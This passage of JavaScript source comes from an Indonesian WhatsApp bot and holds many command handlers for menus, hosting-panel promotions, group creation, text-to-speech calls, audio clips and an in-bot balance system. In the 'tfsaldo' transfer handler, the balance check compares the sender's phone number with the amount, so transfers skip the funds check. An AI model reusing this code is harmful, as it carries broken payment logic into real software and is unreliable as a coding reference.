contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "linkgrup": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK GRUP* )▭▬▭

*LINK GRUP*
${grup}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "ramlist1": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RAM YANG TERSEDIA* )▭▬▭

*SERVER 1*
⭔1GB ( *Premium* )✅
⭔2GB ( *Premium* )✅
⭔3GB ( *Premium* )✅
⭔4GB ( *Premium* )✅
⭔5GB ( *Premium* )✅
⭔6GB ( *Owner* )✅
⭔7GB ( *Owner* )✅
⭔8GB ( *Owner* )✅
⭔9GB ( *Owner* )✅
⭔UNLI ( *Owner* )✅

*JOIN RESELLER CUMA 10K BANG😁*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
} freya = fs.readFileSync('./freya/ramlist.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "ramlist2": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RAM YANG TERSEDIA* )▭▬▭

*SERVER 2*
⭔1GBB ( *Premium* )✅
⭔2GBB ( *Premium* )✅
⭔3GBB ( *Premium* )✅
⭔4GBB ( *Premium* )✅
⭔5GBB ( *Premium* )✅
⭔UNLI ( *Owner* )✅

*JOIN RESELLER CUMA 10K BANG😁*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
} freya = fs.readFileSync('./freya/ramlist.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "tutorial1": case "tutorial2": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/rqqxkI4P8YY )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "sosmed": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SOSMED OWNER* )▭▬▭

*INSTAGRAM OWNER :* 
${instagram}
*YOUTUBE OWNER :* 
${youtube}
*TELEGRAM OWNER :* 
${telegram}
*GROUP OWNER :* 
${grup}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "pm2menu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}
▭▬▭( *PM2 MENU* )▭▬▭

⭔ ${prefix}buycasepm2
⭔ ${prefix}buyeggpm2
⭔ ${prefix}buyapipm2
⭔ ${prefix}buyscpm2

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "stalkmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *STALK MENU* )▭▬▭

⭔ ${prefix}ffstalk

*Note : Sisa Nya Masih Dalam Pengembangan.*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "swmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SW MENU* )▭▬▭

⭔ ${prefix}buatswimage
⭔ ${prefix}buatswvideo
⭔ ${prefix}buatsw
⭔ ${prefix}swin
⭔ ${prefix}vnsw
⭔ ${prefix}inisw

*Note : Sisa Nya Masih Dalam Pengembangan.*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "downloadmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *DOWNLOAD MENU* )▭▬▭

⭔ ${prefix}toaud
⭔ ${prefix}toimg
⭔ ${prefix}tomp4
⭔ ${prefix}ytmp3
⭔ ${prefix}ytmp4
⭔ ${prefix}ytsearch
⭔ ${prefix}smeme
⭔ ${prefix}remini
⭔ ${prefix}hd
⭔ ${prefix}tovn
⭔ ${prefix}togif
⭔ ${prefix}tourl
⭔ ${prefix}tiktok
⭔ ${prefix}ssweb
⭔ ${prefix}tiktokaudio
⭔ ${prefix}mediafire

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "soundmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SOUND MENU* )▭▬▭

⭔ ${prefix}sound1
⭔ ${prefix}sound2
⭔ ${prefix}sound3
⭔ ${prefix}sound4
⭔ ${prefix}sound5
⭔ ${prefix}sound6
⭔ ${prefix}sound7
⭔ ${prefix}sound8
⭔ ${prefix}sound9
⭔ ${prefix}sound10

*SOUND SAMPAI 161 TUAN🙏*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "randommenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RANDOM MENU* )▭▬▭

⭔ ${prefix}randomcecan1
⭔ ${prefix}randomcecan2
⭔ ${prefix}randomcecan3
⭔ ${prefix}randomcecan4
⭔ ${prefix}randomcecan5
⭔ ${prefix}randomcecan6
⭔ ${prefix}randomcecan7
⭔ ${prefix}randomcecan8
⭔ ${prefix}randomcecan9
⭔ ${prefix}randomcecan10

▭▬▭( *TIKTOK RANDOM* )▭▬▭

⭔ ${prefix}tiktokgirl
⭔ ${prefix}tiktokghea
⭔ ${prefix}tiktokbocil
⭔ ${prefix}tiktoknukhty
⭔ ${prefix}tiktoksantuy
⭔ ${prefix}tiktokkayes
⭔ ${prefix}tiktokpanrika
⭔ ${prefix}tiktoknotnot
⭔ ${prefix}chinese
⭔ ${prefix}hijab
⭔ ${prefix}indo
⭔ ${prefix}japanese
⭔ ${prefix}korean
⭔ ${prefix}malay
⭔ ${prefix}randomgirl
⭔ ${prefix}randomboy
⭔ ${prefix}thai
⭔ ${prefix}vietnamese
⭔ ${prefix}aesthetic
⭔ ${prefix}antiwork
⭔ ${prefix}blackpink
⭔ ${prefix}bike
⭔ ${prefix}boneka
⭔ ${prefix}cosplay
⭔ ${prefix}cat
⭔ ${prefix}doggo
⭔ ${prefix}justina
⭔ ${prefix}kayes
⭔ ${prefix}kpop
⭔ ${prefix}notnot

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: fkontak})
}
break
case "creategc":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
if (!text) return reply("Nama groupnya Tuan?")
let cret = await Biiofc.groupCreate(text, [])
let response = await Biiofc.groupInviteCode(cret.id)
let teks = `\`\`\`「  CREATION GROUP MESSAGE  」\`\`\`

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
Biiofc.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
Biiofc.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case 'domainmenu': case 'subdomain': case 'domain':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

*『 LIST DOMAIN 』*
┏━━━━━━━━━━━━━━━━◧
┃  *DOMAIN INFO*
┃╺ Layanan CDN : *CLOUDFLARE*
┃╺ TOTAL DOMAIN : *15*
┃✅ : *DOMAIN BISA DI PAKAI*
┃❌ : *DOMAIN TIDAK BISA DI PAKAI*
┃🛠️ : *SEDANG DALAM PERBAIKAN*
┗━━━━━━━━━━━━━━━━
┣ ${prefix}domain1 tokodigital.software ✅
┣ ${prefix}domain2 rafatharofficial.my.id ✅
┣ ${prefix}domain3 digital-market.me ✅
┣ ${prefix}domain4 sanzyy.xyz ✅
┣ ${prefix}domain5 panelku.link ✅
┣ ${prefix}domain6 panellstore.art ✅
┣ ${prefix}domain7 panellzku-vvip.my.id ✅
┣ ${prefix}domain8 denzhosting.my.id 🛠️
┣ ${prefix}domain9 sellerpanel-store.cfd ✅
┣ ${prefix}domain10 sellerpanell-store.xyz ✅
┣ ${prefix}domain11 mypanell-store.icu ✅
┣ ${prefix}domain12 jasa-install.biz.id ✅
┣ ${prefix}domain13 adminpanelku.cfd ✅
┣ ${prefix}domain14 panellku-vvip.me ❌
┣ ${prefix}domain15 panellku-vvip.my.id ❌
┃© DENZ HOSTING 
┗━━━━━━━━━━━━━━━`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
} freya = fs.readFileSync('./freya/audio.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:fkontak})
break

//batas menu
//domainmenu
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Rafathar = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await Biiofc.sendMessage(m.chat, { audio: Rafathar, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'saldonya': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  if (args.length >= 1) {
    let receiverNumber = args[0].trim(); // Nomor penerima
    if (!receiverNumber.endsWith('@s.whatsapp.net')) {
      // Tambahkan '@s.whatsapp.net' jika tidak ada
      receiverNumber += '@s.whatsapp.net';
    }

    // Menggunakan findIndex untuk mencari data pengguna berdasarkan ID
    const userIndex = db_saldo.findIndex((entry) => entry.id === receiverNumber);

    if (userIndex !== -1) {
      const { id, saldo, transaksi } = db_saldo[userIndex]; // Mengambil informasi dari db_saldo
      const koinPerakPengguna = cekKoinPerak(receiverNumber); // Mengambil jumlah koin perak pengguna
      reply(`*━━ CHECK INFO ━━*
 _• *Nomer:* ${receiverNumber.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(saldo)}_
 _• *Koin Perak:* ${koinPerakPengguna} Koin Perak_`);
    } else {
      reply(`Maaf, informasi untuk ID ${receiverNumber} tidak ditemukan.`);
    }
  } else {
    reply(`Format pesan tidak sesuai. Gunakan format ".sendsaldo 62xxxxx@s.whatsapp.net".`);
  }
}
break;
case 'tfsaldo': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  const args = q.split(',');
  if (args.length !== 2) {
    return reply(`Format yang benar: ${prefix}tfsaldo nomorpenerima,jumlah`);
  }

  const senderNumber = sender.split('@')[0]; // Nomor pengirim dari pengirim perintah
  const receiverNumber = args[0].trim(); // Nomor penerima
  const amount = parseInt(args[1]); // Jumlah saldo yang akan ditransfer

  // Validasi jumlah saldo yang akan ditransfer
  if (isNaN(amount) || amount <= 0) {
    return reply('Jumlah saldo yang valid harus positif dan bukan huruf.');
  }

  // Validasi untuk mencegah mentransfer uang ke diri sendiri
  if (senderNumber === receiverNumber) {
    return reply('Anda tidak dapat mentransfer uang ke diri sendiri.');
  }

  // Cek saldo pengirim
  const senderBalance = cekSaldo(sender + "@s.whatsapp.net", db_saldo);
  if (senderNumber < amount) {
    return reply('Saldo Anda tidak mencukupi.');
  }

  // Kurangkan saldo pengirim
  minSaldo(senderNumber + "@s.whatsapp.net", amount, db_saldo);

  // Tambah saldo penerima
  addSaldo(receiverNumber + "@s.whatsapp.net", amount, db_saldo);

  // Kirim pesan konfirmasi ke pengirim
  const pesan = `*》Catatan* : Transfer Saldo Berhasil\n*》Nomor Penerima* : ${receiverNumber}\n*》Jumlah* : Rp${amount}`;
  Biiofc.sendMessage(sender + "@s.whatsapp.net", {
    text: pesan,
    mentions: [sender]
  }).then(() => {
    reply('Transfer saldo berhasil!');
  }).catch(() => {
    reply('Gagal mengirim pesan konfirmasi ke pengirim saldo.');
  });

  // Kirim pesan konfirmasi ke penerima
  const capt = `Halo @${receiverNumber.split("@")[0]}, Anda telah menerima transfer saldo sebesar Rp${amount}`;
  Biiofc.sendMessage(receiverNumber + "@s.whatsapp.net", {
    text: capt,
    mentions: [receiverNumber]
  }).then(() => {
    // Tidak perlu memberi tahu penerima dalam grup bahwa mereka menerima saldo
  }).catch(() => {
    reply('Gagal mengirim pesan konfirmasi ke penerima saldo.');
  });
}
break;
case'ardi' : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply('masukin teksnya!!')
getBuffer("https://api.yanzbotz.my.id/api/tts/ardi?query=" + q ).then( a => {
Biiofc.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:fkontak})        
})
}
break
case'jajang' : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply('masukin teksnya!!')
getBuffer("https://api.yanzbotz.my.id/api/tts/jajang?query=" + q ).then( a => {
Biiofc.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:fkontak})        
})
}
break
case'gadis' : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply('masukin teksnya!!')
getBuffer("https://api.yanzbotz.my.id/api/tts/gadis?query=" + q ).then( a => {
Biiofc.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:fkontak})        
})
}
break
case'janie' : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply('masukin teksnya!!')
getBuffer("https://api.yanzbotz.my.id/api/tts/janie?query=" + q ).then( a => {
Biiofc.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:fkontak})        
})
}
break
case'siti' : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply('masukin teksnya!!')
getBuffer("https://api.yanzbotz.my.id/api/tts/siti?query=" + q ).then( a => {
Biiofc.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:fkontak})        
})
}
break
case'tuti' : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply('masukin teksnya!!')
getBuffer("https://api.yanzbotz.my.id/api/tts/tuti?query=" + q ).then( a => {
Biiofc.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:fkontak})        
})
}
break
case'gptvoice' : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q) return reply('mau tanya apa')
getBuffer("https://api.yanzbotz.my.id/api/ai/gptvoice?query=" + q ).then( a => {
Biiofc.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:fkontak})        
})
}
break
case 'getcase':

const getCase = (cases) => {

            return "case  "+`'${cases}'`+fs.readFileSync("./appearance.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')

                if (!q) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${q} tidak di temukan`)

        }

        break
case 'grup': case 'gc':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isBotAdmins) return reply(mess.only.badmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
Biiofc.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
Biiofc.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break
case 'totalfitur':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
reply(`_Total Bot Features Are ${totalFitur()}_`)
        break
case 'listpc': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 Biiofc.sendTextWithMentions(m.chat, teks, m)
             }
             break
